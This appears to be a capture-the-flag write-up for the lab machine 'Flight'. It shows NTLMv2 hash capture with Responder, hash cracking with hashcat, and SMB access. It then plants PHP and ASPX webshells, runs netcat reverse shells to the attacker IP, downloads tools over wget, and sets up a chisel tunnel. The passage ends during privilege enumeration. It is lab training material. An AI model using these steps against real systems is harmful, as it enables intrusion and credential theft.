+    Auth proxy                 [OFF]
+    SMB server                 [ON]
+    Kerberos server            [ON]
+    SQL server                 [ON]
+    FTP server                 [ON]
+    IMAP server                [ON]
+    POP3 server                [ON]
+    SMTP server                [ON]
+    DNS server                 [ON]
+    LDAP server                [ON]
+    MQTT server                [ON]
+    RDP server                 [ON]
+    DCE-RPC server             [ON]
+    WinRM server               [ON]
+    SNMP server                [OFF]
+
+[+] HTTP Options:
+    Always serving EXE         [OFF]
+    Serving EXE                [OFF]
+    Serving HTML               [OFF]
+    Upstream Proxy             [OFF]
+
+[+] Poisoning Options:
+    Analyze Mode               [OFF]
+    Force WPAD auth            [OFF]
+    Force Basic Auth           [OFF]
+    Force LM downgrade         [OFF]
+    Force ESS downgrade        [OFF]
+
+[+] Generic Options:
+    Responder NIC              [tun0]
+    Responder IP               [10.10.14.23]
+    Responder IPv6             [dead:beef:2::1015]
+    Challenge set              [random]
+    Don&#x27;t Respond To Names     [&#x27;ISATAP&#x27;, &#x27;ISATAP.LOCAL&#x27;]
+
+[+] Current Session Variables:
+    Responder Machine Name     [WIN-MY1G0TF1MDT]
+    Responder Domain Name      [8T6F.LOCAL]
+    Responder DCE-RPC Port     [49260]
+
+[+] Listening for events...
+
+[SMB] NTLMv2-SSP Client   : 10.10.11.187
+[SMB] NTLMv2-SSP Username : flight.htb\c.bum
+[SMB] NTLMv2-SSP Hash     : c.bum::flight.htb:f293314605c041f6:A58449BBDFCC8353A185F22B21B61DF2:010100000000000080580E8FBB7DDB017D5BCC01942471490000000002000800380054003600460001001E00570049004E002D004D0059003100470030005400460031004D004400540004003400570049004E002D004D0059003100470030005400460031004D00440054002E0038005400360046002E004C004F00430041004C000300140038005400360046002E004C004F00430041004C000500140038005400360046002E004C004F00430041004C000700080080580E8FBB7DDB01060004000200000008003000300000000000000000000000003000001A1EC7812FBF11EDD07C2E7A6304A288C2A0B09CC28EA4DF62E81B9BC70E8D3E0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00320033000000000000000000
+</code></pre><p id="199d1b9f-8847-80f5-8879-d3571edde5f2" class="">
+</p><h3 id="199d1b9f-8847-80ce-960c-cb55fb490a4f" class="">Got Password and hope a shell</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-80d9-865e-fe5aee3e77be" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ hashcat -m 5600 hash2.txt -a 0 /usr/share/wordlists/rockyou.txt
+
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 3.0 PoCL 5.0+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 17.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+==================================================================================================================================================
+* Device #1: cpu-skylake-avx512-11th Gen Intel(R) Core(TM) i7-11700F @ 2.50GHz, 6925/13915 MB (2048 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 256
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Not-Iterated
+* Single-Hash
+* Single-Salt
+
+ATTENTION! Pure (unoptimized) backend kernels selected.
+Pure kernels can crack longer passwords, but drastically reduce performance.
+If you want to switch to optimized kernels, append -O to your commandline.
+See the above message to find out about the exact limits.
+
+Watchdog: Temperature abort trigger set to 90c
+
+Host memory required for this attack: 2 MB
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+C.BUM::flight.htb:f293314605c041f6:a58449bbdfcc8353a185f22b21b61df2:010100000000000080580e8fbb7ddb017d5bcc01942471490000000002000800380054003600460001001e00570049004e002d004d0059003100470030005400460031004d004400540004003400570049004e002d004d0059003100470030005400460031004d00440054002e0038005400360046002e004c004f00430041004c000300140038005400360046002e004c004f00430041004c000500140038005400360046002e004c004f00430041004c000700080080580e8fbb7ddb01060004000200000008003000300000000000000000000000003000001a1ec7812fbf11edd07c2e7a6304a288c2a0b09cc28ea4df62e81b9bc70e8d3e0a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320033000000000000000000:Tikkycoll_431012284
+</code></pre><h3 id="199d1b9f-8847-80b3-8586-fed47fa3caca" class="">Reading user.txt</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-80e2-b48e-c8bfae5b0d38" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ smbclient -U &#x27;c.bum&#x27;  \\\\10.10.11.187\\Users          
+Password for [WORKGROUP\c.bum]:
+Try &quot;help&quot; to get a list of possible commands.
+
+smb: \c.bum\Desktop\&gt; get user.txt
+getting file \c.bum\Desktop\user.txt of size 34 as user.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
+</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="199d1b9f-8847-804f-8713-c46d09c62f0b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ cat user.txt 
+0f2b3ac193fc1fc75e534bf70c5a6e97
+</code></pre><h1 id="199d1b9f-8847-8127-a9eb-f8a2a213a15d" class="">Root</h1><h3 id="19fd1b9f-8847-800b-b109-c1ded8bcf1c0" class="">First, we need to get a reverse shell, let’s upload webshell and nc64 and execute command to reverse shell</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-8073-a657-fa3c767fb6cf" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ smbclient -U &#x27;c.bum&#x27;  -L \\10.10.11.187      
+Password for [WORKGROUP\c.bum]:
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	ADMIN$          Disk      Remote Admin
+	C$              Disk      Default share
+	IPC$            IPC       Remote IPC
+	NETLOGON        Disk      Logon server share 
+	Shared          Disk      
+	SYSVOL          Disk      Logon server share 
+	Users           Disk      
+	Web             Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.11.187 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
+Unable to connect with SMB1 -- no workgroup available
+                                                                                                                 
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ smbclient -U &#x27;c.bum&#x27;  \\\\10.10.11.187\\Web   
+Password for [WORKGROUP\c.bum]:
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; dir
+  .                                   D        0  Wed Feb 19 05:22:00 2025
+  ..                                  D        0  Wed Feb 19 05:22:00 2025
+  flight.htb                          D        0  Wed Feb 19 05:22:00 2025
+  school.flight.htb                   D        0  Wed Feb 19 05:22:00 2025
+smb: \&gt; cd school.flight.htb\
+smb: \school.flight.htb\&gt; ls
+  .                                   D        0  Wed Feb 19 05:22:00 2025
+  ..                                  D        0  Wed Feb 19 05:22:00 2025
+  about.html                          A     1689  Mon Oct 24 22:54:45 2022
+  blog.html                           A     3618  Mon Oct 24 22:53:59 2022
+  home.html                           A     2683  Mon Oct 24 22:56:58 2022
+  images                              D        0  Wed Feb 19 05:22:00 2025
+  index.php                           A     2092  Thu Oct 27 02:59:25 2022
+  lfi.html                            A      179  Thu Oct 27 02:55:16 2022
+  styles                              D        0  Wed Feb 19 05:22:00 2025
+
+		5056511 blocks of size 4096. 1254353 blocks available
+smb: \school.flight.htb\&gt; put nc64.exe 
+putting file nc64.exe as \school.flight.htb\nc64.exe (73.2 kb/s) (average 73.2 kb/s)
+smb: \school.flight.htb\&gt; put webshell.php 
+putting file webshell.php as \school.flight.htb\webshell.php (0.9 kb/s) (average 46.1 kb/s)
+</code></pre><h3 id="19fd1b9f-8847-8041-9d32-e4c623501623" class="">Curling <a href="http://school.flight.htb/webshell.php?cmd=whoami">http://school.flight.htb/webshell.php?cmd=whoami</a></h3><h3 id="19fd1b9f-8847-8054-a62c-f3cf0f23e315" class="">You need to execute reverse shell instant cuz the system delete the webshell</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-802c-88b6-cab75e36593c" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">Execute http://school.flight.htb/webshell.php?cmd=nc64.exe%2010.10.14.4%201205%20-e%20cmd
+The payload is &quot;nc64.exe 10.10.14.4 1205 -e cmd&quot;</code></pre><h3 id="19fd1b9f-8847-8032-91e0-f72f956b945b" class="">Shell as C.Bum</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-80e7-a1fb-e68cade8bd0b" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">PS C:\xampp\htdocs\school.flight.htb&gt; powershell -c wget http://10.10.14.4:8000/RunasCs.exe -Outfile RunasCs.exe 
+powershell -c wget http://10.10.14.4:8000/RunasCs.exe -Outfile RunasCs.exe 
+PS C:\xampp\htdocs\school.flight.htb&gt; .\RunasCs.exe C.Bum Tikkycoll_431012284 -r 10.10.14.4:1206 cmd
+
+
+
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ nc -lnvp 1206 
+listening on [any] 1206 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.11.187] 49853
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32&gt;whoami
+whoami
+flight\c.bum
+
+C:\Windows\system32&gt;
+</code></pre><h3 id="19fd1b9f-8847-808e-ac1c-c91f0a275cf5" class="">Winpeas to gather info</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-8092-8e8f-c62a61838d59" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">powershell -c wget http://10.10.14.4:8000/winPEASx64_ofs.exe -Outfile winPEASx64_ofs.exe</code></pre><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-8001-81ec-e33fb40d79dd" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">C:\Users\C.Bum\Desktop&gt;whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID                                            Attributes                                        
+========================================== ================ ============================================== ==================================================
+Everyone                                   Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                   Group used for deny only                          
+NT AUTHORITY\INTERACTIVE                   Well-known group S-1-5-4                                        Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+flight\WebDevs                             Group            S-1-5-21-4078382237-1492182817-2568127209-1614 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192                     </code></pre><h3 id="19fd1b9f-8847-80cb-bf82-cc0bc3ec6692" class="">Important flight\WebDevs group</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-8067-b567-cab55ca3a692" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">C:\Users\C.Bum\Desktop&gt;netstat -an | findstr LISTENING
+netstat -an | findstr LISTENING
+  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:464            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:593            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:636            0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3268           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:3269           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:8000           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:9389           0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49673          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49674          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49682          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49697          0.0.0.0:0              LISTENING
+  TCP    0.0.0.0:49706          0.0.0.0:0              LISTENING
+  TCP    10.10.11.187:53        0.0.0.0:0              LISTENING
+  TCP    10.10.11.187:139       0.0.0.0:0              LISTENING
+</code></pre><h3 id="19fd1b9f-8847-80d3-95d9-d31fdfa39673" class="">Setup chisel</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-80fc-91f6-eac59244c46d" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ ./chisel_linux_amd64 server -p 8000 --reverse
+2025/02/19 10:00:32 server: Reverse tunnelling enabled
+2025/02/19 10:00:32 server: Fingerprint b17jIf0xT3Epw+Obg6kYsHDMRdMJIAn+7FLLYDiUdG8=
+2025/02/19 10:00:32 server: Listening on http://0.0.0.0:8000
+2025/02/19 10:00:36 server: session#1: tun: proxy#R:8001=&gt;8000: Listening
+
+
+C:\xampp\htdocs\flight.htb&gt;.\chisel_windows_x64_amd64.exe client 10.10.14.4:8000 R:8001:127.0.0.1:8000
+.\chisel_windows_x64_amd64.exe client 10.10.14.4:8000 R:8001:127.0.0.1:8000
+2025/02/19 14:01:01 client: Connecting to ws://10.10.14.4:8000
+</code></pre><figure id="19fd1b9f-8847-8099-9d2b-edffa30e38c8" class="image"><a href="../img/Flight/image 6.png"><img style="width:709.96875px" src="../img/Flight/image 6.png"/></a></figure><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-8023-ba06-c5c3fc828580" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ whatweb &quot;http://127.0.0.1:8001/&quot; -a 3  
+http://127.0.0.1:8001/ [200 OK] Bootstrap[3.3.1], Country[RESERVED][ZZ], Frame, Google-API[ajax/libs/jquery/1.10.2/jquery.min.js], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[127.0.0.1], JQuery[1.10.2,1.11.2], Microsoft-IIS[10.0], Modernizr[2.8.3-respond-1.4.2.min], Script[text/javascript], Title[Flight - Travel and Tour], X-Powered-By[ASP.NET], X-UA-Compatible[IE=edge], YouTube
+</code></pre><h3 id="19fd1b9f-8847-80dd-82f6-e3d2a0f9321f" class="">Maybe aspx reverse shell to know if is the same user or other who run this site? → put shell over smbclient and then copy to new development site</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-80ba-a715-ed290e0a8134" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">C:\inetpub\development&gt;copy ..\..\xampp\htdocs\flight.htb\cmdasp.aspx .
+copy ..\..\xampp\htdocs\flight.htb\cmdasp.aspx .
+        1 file(s) copied.
+</code></pre><figure id="19fd1b9f-8847-8083-8fe8-e9e1a1e27ae5" class="image"><a href="../img/Flight/image 7.png"><img style="width:709.890625px" src="../img/Flight/image 7.png"/></a></figure><h3 id="19fd1b9f-8847-8024-9d82-ccbb88daceb1" class="">We are other user, so let’s execute nc64.exe to get ooooother shell as defaultapppool</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-80b7-a703-d4a7b46d640a" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">
+C:\inetpub\development\development&gt;copy ..\..\xampp\htdocs\flight.htb\nc64.exe .
+copy ..\..\..\xampp\htdocs\flight.htb\nc64.exe .
+        1 file(s) copied.
+
+
+Payload -&gt; nc64.exe 10.10.14.4 1210 -e cmd</code></pre><h3 id="19fd1b9f-8847-80d4-9f5c-e35877576628" class="">But this normal way it’s not possible, searching other webshells I found this one → <a href="https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx">https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx</a></h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-80c2-9625-c4efd90e9634" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">Arguments -&gt; /c \inetpub\development\nc64.exe 10.10.14.4 1210 -e cmd
+
+┌──(drroot㉿drroot)-[~/Desktop/.htb/Flight]
+└─$ nc -lnvp 1210
+listening on [any] 1210 ...
+connect to [10.10.14.4] from (UNKNOWN) [10.10.11.187] 51957
+Microsoft Windows [Version 10.0.17763.2989]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+c:\windows\system32\inetsrv&gt;whoami
+whoami
+iis apppool\defaultapppool
+
+c:\windows\system32\inetsrv&gt;whoami /groups
+whoami /groups
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                 Type             SID          Attributes                                        
+========================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                   
+Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                       Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                          Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                           Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+</code></pre><h3 id="19fd1b9f-8847-80c4-91c6-fb850a505d86" class="">Do a fast enumeration</h3><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="19fd1b9f-8847-80f3-9d0e-e537f581d559" class="code"><code class="language-Bash" style="white-space:pre-wrap;word-break:break-all">c:\windows\system32\inetsrv&gt;whoami /priv
+whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeMachineAccountPrivilege     Add workstations to domain                Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
